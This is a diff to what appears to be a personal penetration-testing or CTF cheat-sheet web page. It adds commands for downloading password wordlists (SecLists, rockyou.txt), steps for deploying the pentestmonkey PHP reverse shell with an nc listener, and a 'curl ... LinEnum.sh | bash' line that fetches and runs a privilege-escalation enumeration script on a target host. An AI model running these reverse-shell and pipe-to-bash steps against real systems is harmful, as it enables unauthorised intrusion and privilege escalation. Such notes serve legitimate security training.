@@ -142,11 +142,21 @@
 <ul>
 <li><a href="https://gchq.github.io/CyberChef/">CyberChef</a></li>
 </ul>
+<h2 id="wordlists"><a class="header" href="#wordlists">Wordlists</a></h2>
+<p>SecLists:</p>
+<pre><code class="language-bash">git clone https://github.com/danielmiessler/SecLists
+</code></pre>
+<p>rockyou.txt:</p>
+<pre><code class="language-bash">curl -LO https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="php-reverse-shell"><a class="header" href="#php-reverse-shell">PHP reverse shell</a></h1>
 <p>First, download the script:</p>
 <pre><code>curl -LO https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 </code></pre>
-<p>Change <code>ip</code> and <code>port</code> in the script (use <code>ip addr</code> for ip). Also probably rename, see <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Bypass File Upload Filtering</a>.</p>
+<p>Change <code>ip</code> and <code>port</code> in the script (use <code>ip addr</code> for ip, <code>port</code> can be anything that's available):</p>
+<pre><code>nano php-reverse-shell.php
+</code></pre>
+<p>Also probably rename, see <a href="https://sushant747.gitbooks.io/total-oscp-guide/content/bypass_image_upload.html">Bypass File Upload Filtering</a>.</p>
 <p>Next, start <code>nc</code>:</p>
 <pre><code>nc -lvnp &lt;port&gt;
 </code></pre>
@@ -156,8 +166,12 @@
 </code></pre>
 <p>For even more, see <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrading Simple Shells to Fully Interactive TTYs</a></p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="linenum"><a class="header" href="#linenum">LinEnum</a></h1>
+<p>If <code>curl</code> works:</p>
+<pre><code>curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
+</code></pre>
+<p>Otherwise, copy and paste from link above:</p>
 <pre><code>cd /tmp
-wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+nano LinEnum.sh
 bash LinEnum.sh
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="suid"><a class="header" href="#suid">SUID</a></h1>
